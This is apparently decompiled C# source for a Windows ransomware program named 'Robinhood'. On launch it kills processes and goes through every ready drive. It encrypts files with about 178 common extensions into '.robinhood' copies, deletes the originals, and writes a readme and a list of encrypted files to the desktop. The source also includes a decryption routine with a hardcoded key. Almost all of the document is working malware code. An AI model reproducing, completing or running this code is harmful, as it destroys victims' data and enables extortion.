using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Robinhood;

public class frmRobinhoodMain : Form
{
	private string[] arrUzantilar = new string[178]
	{
		".jpg", ".jpeg", ".raw", ".png", ".gif", ".png", ".bmp", ".rpt", ".evtx", ".sh",
		".platform", ".3dm", ".max", ".platform", "", ".accdb", ".db", ".dbf", ".mdb", ".pdb",
		".sql", ".pl", ".lst", ".sbs", ".msb", ".dwg", ".dxf", ".c", ".cpp", ".cs",
		".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf",
		".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl",
		".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps",
		".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm",
		".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt",
		".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw",
		".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm",
		".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa",
		".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx",
		".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".dat", ".csv", ".efx", ".sdf",
		".vcf", ".xml", ".ses", ".out", ".rar", ".zip", ".7zip", ".vb", ".vbproj", ".snippet",
		".config", ".conf", ".cab", ".log", ".ini", ".properties", ".bat", ".iaf", ".wab", ".dbx",
		".ico", ".exexx", ".rpf", ".cer", ".crdownload", ".bak", ".p7b", ".gdb", ".ttf", ".html",
		".rav", ".xsd", ".7z", ".bin", ".iss", ".ini_", ".cat", ".inf", ".sys", ".boot",
		".pdb", ".pfx", ".history", ".lck", ".ctrl", ".hdr", ".skin", ".bkp1"
	};

	private string[] IgnoredDirs = new string[10] { "robinhood", "windows", "$recycle.bin", "config.msi", "robinhood-enc", "robinhood-dec", "microsoft sdks", "microsoft.net", "microsoft", "microsoft shared" };

	private int length = 0;

	private IContainer components = null;

	private TextBox tx_warning;

	private ListBox lbEncrypted;

	private Label label1;

	public frmRobinhoodMain()
	{
		InitializeComponent();
	}

	private void frmRobinhoodMain_Load(object sender, EventArgs e)
	{
		WinHelper.InitRobinhood();
		WinHelper.KillProcess();
		string text = Guid.NewGuid().ToString();
		string s = "!!_1A3__4Z8_RHODD" + text;
		WinHelper.WrtLg(text);
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					Console.WriteLine("Drive Type: {0}", driveInfo.DriveType);
					Console.WriteLine("Drive Size: {0}", driveInfo.TotalSize);
					Console.WriteLine("Drive Free Space: {0}", driveInfo.TotalFreeSpace);
					enc_Location(driveInfo.Name, Encoding.ASCII.GetBytes(s));
				}
			}
		}
		catch (Exception ex)
		{
			WinHelper.WrtLg(ex.Message);
		}
		finally
		{
			new StringBuilder();
			string text2 = "";
			((Control)tx_warning).set_Text(text2);
			try
			{
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ReadmeRobinhood.txt", text2);
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\encfiles.txt", File.ReadAllText(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\encfiles.txt"));
				ObjectCollection items = lbEncrypted.get_Items();
				object[] array = File.ReadAllLines(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\encfiles.txt");
				items.AddRange(array);
			}
			catch (Exception)
			{
			}
		}
	}

	public void enc_Location(string location, byte[] prm_password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					if (arrUzantilar.Contains(extension.ToLower()))
					{
						byte[] array = File.ReadAllBytes(files[i]);
						byte[] bytes = CHelper.Y_Enc(array, prm_password);
						length += array.Length;
						File.WriteAllBytes(string.Concat(location + "\\", Path.GetFileName(files[i]), ".robinhood"), bytes);
						File.Delete(files[i]);
						WinHelper.WrtLgenc(files[i]);
						Console.WriteLine(files[i]);
					}
				}
				catch (Exception ex)
				{
					WinHelper.WrtLg("enc failed:" + files[i] + " " + ex.Message);
					Console.WriteLine("enc failed:" + files[i] + " " + ex.Message);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!IgnoredDirs.Contains(new DirectoryInfo(directories[j]).Name.ToLower()))
				{
					enc_Location(directories[j], prm_password);
				}
			}
		}
		catch (Exception ex2)
		{
			WinHelper.WrtLg(ex2.Message + " " + location);
			Console.Write(ex2.Message + " " + location);
		}
	}

	public void Dec_Location(string location, string password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (".robinhood" == extension.ToLower())
				{
					byte[] array = File.ReadAllBytes(files[i]);
					byte[] bytes = CHelper.Y_Dec(array, new byte[7] { 123, 240, 14, 25, 55, 87, 55 });
					length += array.Length;
					File.WriteAllBytes(string.Concat(location + "\\", Path.GetFileName(files[i])!.Replace(".robinhood", "")), bytes);
					File.Delete(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!IgnoredDirs.Contains(new DirectoryInfo(directories[j]).Name.ToLower()))
				{
					Dec_Location(directories[j], password);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Expected O, but got Unknown
		tx_warning = new TextBox();
		lbEncrypted = new ListBox();
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)tx_warning).set_Anchor((AnchorStyles)13);
		((Control)tx_warning).set_BackColor(Color.MediumSpringGreen);
		((Control)tx_warning).set_Enabled(false);
		((Control)tx_warning).set_Location(new Point(4, 4));
		((TextBoxBase)tx_warning).set_Multiline(true);
		((Control)tx_warning).set_Name("tx_warning");
		((Control)tx_warning).set_Size(new Size(847, 209));
		((Control)tx_warning).set_TabIndex(0);
		((Control)lbEncrypted).set_Anchor((AnchorStyles)15);
		((Control)lbEncrypted).set_BackColor(Color.MediumSpringGreen);
		((ListControl)lbEncrypted).set_FormattingEnabled(true);
		((Control)lbEncrypted).set_Location(new Point(4, 232));
		((Control)lbEncrypted).set_Name("lbEncrypted");
		((Control)lbEncrypted).set_Size(new Size(847, 134));
		((Control)lbEncrypted).set_TabIndex(1);
		((Control)label1).set_Anchor((AnchorStyles)15);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(1, 216));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(92, 13));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("şifreli dosyalar:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(856, 368));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lbEncrypted);
		((Control)this).get_Controls().Add((Control)(object)tx_warning);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_ImeMode((ImeMode)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmRobinhoodMain");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Robinhood");
		((Form)this).add_Load((EventHandler)frmRobinhoodMain_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
